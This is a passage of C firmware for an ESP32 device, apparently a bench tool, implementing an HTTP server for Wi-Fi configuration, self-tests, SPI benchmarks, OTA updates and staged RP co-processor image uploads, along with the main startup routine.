    st_opts = (uint8_t)((opt_flash != 0 ? SELFTEST_OPT_FLASH : 0) | (opt_switch != 0 ? SELFTEST_OPT_SWITCH : 0));
    st_deadline_ms = bench_now_ms() + ST_RP_TIMEOUT_MS;
    st_state = ST_RUNNING;

    selftest_run_local();

    ESP_LOGI(TAG, "self test run %u armed, options %02x", (unsigned)st_run_id, (unsigned)st_opts);

    selftest_render(conn, 0);
}

static void wifi_render(http_conn_t *conn)
{
    char stamp[48];

    wifi_build_stamp(stamp, sizeof(stamp));

    uint32_t ip = wifi_ip;

    int len = snprintf(http_body, sizeof(http_body),
                       "mode=%s\n"
                       "state=%s\n"
                       "ssid=%s\n"
                       "ap_ssid=%s\n"
                       "haspass=%d\n"
                       "forced_ap=%d\n"
                       "ip=%u.%u.%u.%u\n"
                       "build=%s\n",
                       wifi_want_sta ? "sta" : "ap",
                       wifi_link == WIFI_LINK_STA ? "connected"
                                                  : (wifi_link == WIFI_LINK_CONNECTING ? "connecting" : "ap"),
                       wifi_ssid, wifi_ap_ssid, wifi_pass[0] != '\0' ? 1 : 0, wifi_forced_ap ? 1 : 0,
                       (unsigned)(ip & 0xff), (unsigned)((ip >> 8) & 0xff), (unsigned)((ip >> 16) & 0xff),
                       (unsigned)((ip >> 24) & 0xff), stamp);

    if (len <= 0 || (size_t)len >= sizeof(http_body))
    {
        http_reply_no_content(conn, NULL);
        return;
    }

    http_reply(conn, "200 OK", HTTP_TEXT_PLAIN, NULL, http_body, (size_t)len);
}

static void route_wifi(http_conn_t *conn, const char *path)
{
    uint32_t save = 0;

    http_query_uint(path, "save", &save);

    if (save == 0)
    {
        wifi_render(conn);
        return;
    }

    const char *busy = busy_reason();

    if (busy != NULL)
    {
        char body[96];

        snprintf(body, sizeof(body), "%s, saving now would reboot in the middle of it\n", busy);
        http_reply_text(conn, "409 Conflict", body);

        return;
    }

    char ssid[WIFI_SSID_MAX];
    char pass[WIFI_PASS_MAX];
    uint32_t mode = 0;

    ssid[0] = '\0';
    pass[0] = '\0';

    http_query_uint(path, "mode", &mode);
    http_query_str(path, "ssid", ssid, sizeof(ssid));

    if (!http_query_str(path, "pass", pass, sizeof(pass)))
    {
        snprintf(pass, sizeof(pass), "%s", wifi_pass);
    }

    if (mode == 1 && ssid[0] == '\0')
    {
        http_reply_text(conn, "400 Bad Request", "a network name is required to join one\n");
        return;
    }

    if (pass[0] != '\0' && strlen(pass) < 8)
    {
        http_reply_text(conn, "400 Bad Request", "a password must be at least 8 characters, or empty for open\n");
        return;
    }

    if (!wifi_cfg_save(ssid, pass, mode == 1))
    {
        http_reply_text(conn, "500 Internal Server Error", "could not write the settings\n");
        return;
    }

    ESP_LOGW(WIFI_TAG, "wifi settings changed to %s %s, rebooting", mode == 1 ? "client" : "access point", ssid);

    wifi_reboot_at_ms = bench_now_ms() + 1200;

    http_reply_text(conn, "200 OK", "saved, the device is rebooting to apply it\n");
}

static void rp_upload_fail(http_conn_t *conn, const char *reason)
{
    char body[176];

    rp_upload_cleanup();
    rp_image_invalidate();

    ESP_LOGE(TAG, "RP image upload failed: %s", reason);
    snprintf(body, sizeof(body), "RP image upload failed: %s\n", reason);

    conn->state = HTTP_CONN_SEND;
    conn->deadline_ms = http_now_ms() + HTTP_SEND_TIMEOUT_MS;
    http_reply_text(conn, "500 Internal Server Error", body);
}

static bool rp_upload_begin(http_conn_t *conn, size_t length)
{
    if (rp_upload_fd >= 0)
    {
        rp_upload_fail(conn, "another upload is already in progress");
        return false;
    }

    if (length == 0 || length > RP_IMAGE_MAX_SIZE)
    {
        char reason[128];

        snprintf(reason, sizeof(reason), "size %u out of range (1..%u), nothing was changed\n", (unsigned)length,
                 (unsigned)RP_IMAGE_MAX_SIZE);

        conn->state = HTTP_CONN_SEND;
        conn->deadline_ms = http_now_ms() + HTTP_SEND_TIMEOUT_MS;
        http_reply_text(conn, "400 Bad Request", reason);

        return false;
    }

    rp_upload_fd = open(RP_IMAGE_TMP_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0666);
    if (rp_upload_fd < 0)
    {
        rp_upload_fail(conn, "could not create " RP_IMAGE_TMP_PATH);
        return false;
    }

    rp_upload_crc = 0xFFFFFFFFu;
    conn->body_expected = length;
    conn->body_received = 0;

    ESP_LOGI(TAG, "RP image upload started, %u bytes", (unsigned)length);

    return true;
}

static void rp_upload_finish(http_conn_t *conn)
{
    char body[192];

    close(rp_upload_fd);
    rp_upload_fd = -1;

    uint32_t staged_size = (uint32_t)conn->body_received;
    uint32_t staged_crc = rp_upload_crc ^ 0xFFFFFFFFu;

    int fd = open(RP_IMAGE_TMP_PATH, O_RDONLY);
    if (fd < 0)
    {
        rp_upload_fail(conn, "could not reopen the staged image");
        return;
    }

    bool on_disk_ok = rp_image_verify_on_disk(fd, staged_size, staged_crc);
    close(fd);

    if (!on_disk_ok)
    {
        rp_upload_fail(conn, "the staged image on flash does not match its crc");
        return;
    }

    if (!ota_publish_staged_rp_image(staged_size, staged_crc))
    {
        rp_upload_fail(conn, "could not put the verified image in place");
        return;
    }

    snprintf(body, sizeof(body), "RP image staged\nsize: %u bytes\ncrc32: %08x\nblocks: %u\n",
             (unsigned)rp_image_size, (unsigned)rp_image_crc,
             (unsigned)((rp_image_size + SPI_BLOCK_PAYLOAD - 1) / SPI_BLOCK_PAYLOAD));

    ESP_LOGI(TAG, "RP image staged, %u bytes crc %08x", (unsigned)rp_image_size, (unsigned)rp_image_crc);

    conn->state = HTTP_CONN_SEND;
    conn->deadline_ms = http_now_ms() + HTTP_SEND_TIMEOUT_MS;
    http_reply_text(conn, "200 OK", body);
}

static void rp_upload_consume(http_conn_t *conn, const uint8_t *data, size_t len)
{
    size_t remaining = conn->body_expected - conn->body_received;

    if (len > remaining)
    {
        len = remaining;
    }

    if (len > 0)
    {
        if (write(rp_upload_fd, data, len) != (int)len)
        {
            rp_upload_fail(conn, "write to SPIFFS failed");
            return;
        }

        rp_upload_crc = crc32_update(rp_upload_crc, data, len);
    }

    conn->body_received += len;

    if (conn->body_received >= conn->body_expected)
    {
        rp_upload_finish(conn);
    }
}

static void http_body_consume(http_conn_t *conn, const uint8_t *data, size_t len)
{
    if (conn->body_sink == HTTP_BODY_OTA)
    {
        ota_consume(conn, data, len);
    }
    else
    {
        rp_upload_consume(conn, data, len);
    }
}

static void http_body_fail(http_conn_t *conn, const char *reason)
{
    if (conn->body_sink == HTTP_BODY_OTA)
    {
        ota_fail(conn, reason);
    }
    else
    {
        rp_upload_fail(conn, reason);
    }
}

static void http_dispatch(http_conn_t *conn, const char *body, size_t body_len)
{
    char method[8] = {0};
    char path[HTTP_PATH_MAX] = {0};

    stats.http_requests++;
    app_validation_confirm();

    conn->state = HTTP_CONN_SEND;

    if (sscanf(conn->req, "%7s %127s", method, path) != 2)
    {
        http_reply_text(conn, "400 Bad Request", "bad request\n");
        return;
    }

    ESP_LOGI(HTTP_TAG, "%s %s", method, path);

    if (strcmp(method, "POST") == 0)
    {
        size_t length = 0;
        bool is_ota = http_path_is(path, "/ota");
        bool is_rp_image = http_path_is(path, "/rpimage");

        if (!is_ota && !is_rp_image)
        {
            http_reply_text(conn, "404 Not Found", "no such endpoint\n");
            return;
        }

        if (!http_content_length(conn->req, &length))
        {
            http_reply_text(conn, "411 Length Required", "Content-Length is required\n");
            return;
        }

        if (upload_owner != NULL && upload_owner != conn)
        {
            http_reply_text(conn, "409 Conflict", "another upload is already in progress\n");
            return;
        }

        if (ota_reboot_pending)
        {
            http_reply_text(conn, "409 Conflict", "an update is already committed, the device is rebooting\n");
            return;
        }

        if (spi_bench_state == BENCH_ARMED || spi_bench_state == BENCH_RUNNING || st_state == ST_RUNNING)
        {
            http_reply_text(conn, "409 Conflict",
                            "a benchmark or self test is running, it owns the link this upload needs\n");
            return;
        }

        conn->body_sink = is_ota ? HTTP_BODY_OTA : HTTP_BODY_RPIMAGE;
        upload_owner = conn;

        if (is_ota ? !ota_begin(conn, length) : !rp_upload_begin(conn, length))
        {
            return;
        }

        conn->state = HTTP_CONN_BODY;

        if (http_expects_continue(conn->req))
        {
            const char *interim = "HTTP/1.1 100 Continue\r\n\r\n";

            send(conn->fd, interim, strlen(interim), 0);
        }

        http_body_consume(conn, (const uint8_t *)body, body_len);

        return;
    }

    if (strcmp(method, "GET") != 0)
    {
        http_reply_text(conn, "405 Method Not Allowed", "only GET and POST are supported\n");
        return;
    }

    if (http_path_is(path, "/"))
    {
        http_reply_index(conn);
    }
    else if (http_path_is(path, "/buffer"))
    {
        route_buffer(conn, path);
    }
    else if (http_path_is(path, "/esp"))
    {
        route_esp(conn);
    }
    else if (http_path_is(path, "/rp"))
    {
        route_rp(conn);
    }
    else if (http_path_is(path, "/ver"))
    {
        http_reply_text(conn, "200 OK", FIRMV_STR);
    }
    else if (http_path_is(path, "/hwver"))
    {
        route_hwver(conn);
    }
    else if (http_path_is(path, "/stats"))
    {
        route_stats(conn);
    }
    else if (http_path_is(path, "/versions"))
    {
        route_versions(conn);
    }
    else if (http_path_is(path, "/spibench"))
    {
        route_spibench(conn, path);
    }
    else if (http_path_is(path, "/selftest"))
    {
        route_selftest(conn, path);
    }
    else if (http_path_is(path, "/wifi"))
    {
        route_wifi(conn, path);
    }
    else if (http_path_is(path, "/rpcommit"))
    {
        if (!rp_image_ready)
        {
            http_reply_text(conn, "409 Conflict", "no RP image staged, upload one to /rpimage first\n");
        }
        else
        {
            rp_commit_frames_left = SPI_BENCH_ARM_FRAMES;
            http_reply_text(conn, "200 OK", "commit requested, the RP applies it and reboots\n");
        }
    }
    else if (http_path_is(path, "/rpreset"))
    {
        esp_rp_reset_pending = true;
        http_reply_text(conn, "200 OK", "reset requested, the RP reboots and takes the ESP with it\n");
    }
    else if (http_path_is(path, "/favicon.ico"))
    {
        http_reply_no_content(conn, NULL);
    }
    else
    {
        http_reply(conn, "404 Not Found", HTTP_TEXT_HTML, NULL, "<h1>404 Not Found</h1>", 22);
    }
}

static void http_handle_recv(http_conn_t *conn)
{
    size_t room = sizeof(conn->req) - 1 - conn->req_len;
    if (room == 0)
    {
        http_conn_close(conn);
        return;
    }

    int n = recv(conn->fd, conn->req + conn->req_len, room, 0);
    if (n == 0)
    {
        http_conn_close(conn);
        return;
    }

    if (n < 0)
    {
        if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
        {
            return;
        }

        http_conn_close(conn);
        return;
    }

    conn->req_len += (size_t)n;
    conn->req[conn->req_len] = '\0';

    char *split = strstr(conn->req, "\r\n\r\n");
    if (split == NULL)
    {
        if (conn->req_len + 1 >= sizeof(conn->req))
        {
            http_reply_text(conn, "431 Request Header Fields Too Large", "headers too large\n");
            conn->state = HTTP_CONN_SEND;
            conn->deadline_ms = http_now_ms() + HTTP_SEND_TIMEOUT_MS;
        }

        return;
    }

    const char *body = split + 4;
    size_t body_len = conn->req_len - (size_t)(body - conn->req);

    conn->deadline_ms = http_now_ms() + HTTP_SEND_TIMEOUT_MS;
    http_dispatch(conn, body, body_len);
}

static void http_handle_body(http_conn_t *conn)
{
    size_t remaining = conn->body_expected - conn->body_received;
    size_t want = remaining < sizeof(conn->req) ? remaining : sizeof(conn->req);

    int n = recv(conn->fd, conn->req, want, 0);
    if (n == 0)
    {
        http_body_fail(conn, "the connection closed before the image was complete");
        return;
    }

    if (n < 0)
    {
        if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
        {
            return;
        }

        http_body_fail(conn, "socket error while receiving the image");
        return;
    }

    conn->deadline_ms = http_now_ms() + HTTP_SEND_TIMEOUT_MS;
    http_body_consume(conn, (const uint8_t *)conn->req, (size_t)n);
}

static void http_handle_send(http_conn_t *conn)
{
    while (conn->resp_sent < conn->resp_len)
    {
        int n = send(conn->fd, conn->resp + conn->resp_sent, conn->resp_len - conn->resp_sent, 0);
        if (n > 0)
        {
            conn->resp_sent += (size_t)n;
            continue;
        }

        if (n < 0 && (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR))
        {
            return;
        }

        http_conn_close(conn);
        return;
    }

    if (conn->send_left == 0)
    {
        http_conn_close(conn);
        return;
    }

    size_t chunk = conn->send_left < sizeof(conn->resp) ? conn->send_left : sizeof(conn->resp);

    memcpy(conn->resp, conn->send_ptr, chunk);

    conn->send_ptr += chunk;
    conn->send_left -= chunk;

    conn->resp_len = chunk;
    conn->resp_sent = 0;
    conn->deadline_ms = http_now_ms() + HTTP_SEND_TIMEOUT_MS;
}

static http_conn_t *http_conn_alloc(void)
{
    for (int i = 0; i < HTTP_MAX_CONN; ++i)
    {
        if (http_conns[i].state == HTTP_CONN_FREE)
        {
            return &http_conns[i];
        }
    }

    return NULL;
}

static void http_accept(int listen_fd)
{
    struct sockaddr_in source;
    socklen_t source_len = sizeof(source);

    int fd = accept(listen_fd, (struct sockaddr *)&source, &source_len);
    if (fd < 0)
    {
        return;
    }

    http_conn_t *conn = http_conn_alloc();
    if (conn == NULL)
    {
        stats.http_rejected++;
        close(fd);
        return;
    }

    int flags = fcntl(fd, F_GETFL, 0);
    fcntl(fd, F_SETFL, flags | O_NONBLOCK);

    int one = 1;
    setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));

    conn->fd = fd;
    conn->send_ptr = NULL;
    conn->send_left = 0;
    conn->state = HTTP_CONN_RECV;
    conn->req_len = 0;
    conn->resp_len = 0;
    conn->resp_sent = 0;
    conn->deadline_ms = http_now_ms() + HTTP_RECV_TIMEOUT_MS;
}

static void http_server_task(void *arg)
{
    (void)arg;

    for (int i = 0; i < HTTP_MAX_CONN; ++i)
    {
        http_conns[i].fd = -1;
        http_conns[i].send_ptr = NULL;
        http_conns[i].send_left = 0;
        http_conns[i].state = HTTP_CONN_FREE;
    }

    int listen_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (listen_fd < 0)
    {
        ESP_LOGE(HTTP_TAG, "socket() failed: %d", errno);
        vTaskDelete(NULL);
        return;
    }

    int yes = 1;
    setsockopt(listen_fd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes));

    struct sockaddr_in addr = {
        .sin_family = AF_INET, .sin_port = htons(HTTP_PORT), .sin_addr.s_addr = htonl(INADDR_ANY)};

    if (bind(listen_fd, (struct sockaddr *)&addr, sizeof(addr)) != 0)
    {
        ESP_LOGE(HTTP_TAG, "bind() failed: %d", errno);
        close(listen_fd);
        vTaskDelete(NULL);
        return;
    }

    if (listen(listen_fd, HTTP_LISTEN_BACKLOG) != 0)
    {
        ESP_LOGE(HTTP_TAG, "listen() failed: %d", errno);
        close(listen_fd);
        vTaskDelete(NULL);
        return;
    }

    int listen_flags = fcntl(listen_fd, F_GETFL, 0);
    fcntl(listen_fd, F_SETFL, listen_flags | O_NONBLOCK);

    ESP_LOGI(HTTP_TAG, "HTTP server listening on :%d", HTTP_PORT);

    while (1)
    {
        fd_set read_set;
        fd_set write_set;

        FD_ZERO(&read_set);
        FD_ZERO(&write_set);

        int max_fd = -1;
        bool has_free_slot = false;

        for (int i = 0; i < HTTP_MAX_CONN; ++i)
        {
            http_conn_t *conn = &http_conns[i];

            if (conn->state == HTTP_CONN_FREE)
            {
                has_free_slot = true;
                continue;
            }

            if (conn->state == HTTP_CONN_RECV || conn->state == HTTP_CONN_BODY)
            {
                FD_SET(conn->fd, &read_set);
            }
            else
            {
                FD_SET(conn->fd, &write_set);
            }

            max_fd = MAX(max_fd, conn->fd);
        }

        if (has_free_slot)
        {
            FD_SET(listen_fd, &read_set);
            max_fd = MAX(max_fd, listen_fd);
        }

        struct timeval timeout = {.tv_sec = 0, .tv_usec = HTTP_SELECT_TIMEOUT_MS * 1000};

        int ready = select(max_fd + 1, &read_set, &write_set, NULL, &timeout);
        if (ready < 0)
        {
            if (errno != EINTR)
            {
                ESP_LOGW(HTTP_TAG, "select() error: %d", errno);
                vTaskDelay(pdMS_TO_TICKS(10));
            }

            continue;
        }

        int64_t now = http_now_ms();

        for (int i = 0; i < HTTP_MAX_CONN; ++i)
        {
            http_conn_t *conn = &http_conns[i];

            if (conn->state == HTTP_CONN_RECV && FD_ISSET(conn->fd, &read_set))
            {
                http_handle_recv(conn);
            }
            else if (conn->state == HTTP_CONN_BODY && FD_ISSET(conn->fd, &read_set))
            {
                http_handle_body(conn);
            }
            else if (conn->state == HTTP_CONN_SEND && FD_ISSET(conn->fd, &write_set))
            {
                http_handle_send(conn);
            }

            if (conn->state != HTTP_CONN_FREE && now > conn->deadline_ms)
            {
                http_conn_close(conn);
            }
        }

        if (has_free_slot && FD_ISSET(listen_fd, &read_set))
        {
            http_accept(listen_fd);
        }

        app_validation_check_timeout(now);

        if (rp_commit_completed)
        {
            rp_commit_completed = false;
            rp_commit_pending = false;

            rp_image_invalidate();
            unlink(RP_IMAGE_PATH);
            ota_nvs_clear_rp_pending();

            ESP_LOGW(TAG, "RP update confirmed by the RP itself, staged image removed");
        }

        if (ota_reboot_pending)
        {
            bool flushing = false;

            for (int i = 0; i < HTTP_MAX_CONN; ++i)
            {
                if (http_conns[i].state == HTTP_CONN_SEND)
                {
                    flushing = true;
                    break;
                }
            }

            if (!flushing)
            {
                ESP_LOGW(HTTP_TAG, "rebooting into the freshly written image");
                vTaskDelay(pdMS_TO_TICKS(OTA_REBOOT_DELAY_MS));
                esp_restart();
            }
        }
    }
}

void app_main(void)
{
#ifndef ENABLE_DEBUG
    esp_log_level_set("*", ESP_LOG_NONE);
#endif

    snprintf(rp_status[0], RP_STATUS_MAX, "RP ALL OK");
    rp_status_index = 0;

    app_validation_init();

    xTaskCreate(spi_task, "spi_task", 4096, NULL, configMAX_PRIORITIES - 1, NULL);
    xTaskCreate(led_task, "led_task", 2048, NULL, tskIDLE_PRIORITY + 1, NULL);

    spiffs_init();

    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND)
    {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    wifi_cfg_load();

    reset_count_bump();

    rp_image_restore_after_boot();

    wifi_start();

    uart_init();

    xTaskCreate(http_server_task, "http_server_task", 4096 + 1024, NULL, tskIDLE_PRIORITY + 4, NULL);
    xTaskCreate(uart_rx_task, "uart_rx_task", 2560, NULL, tskIDLE_PRIORITY + 1, NULL);

    // If a resilient benchmark was cut short by a reset, re-arm it now that the
    // SPI task is up, so the RP resumes the confirmation below the clock that
    // browned the board out and converges to the highest stable one on its own.
    rbench_resume_after_boot();

    ESP_LOGI(TAG, "okhi main done");
}

#endif // __COM_ESP_H__
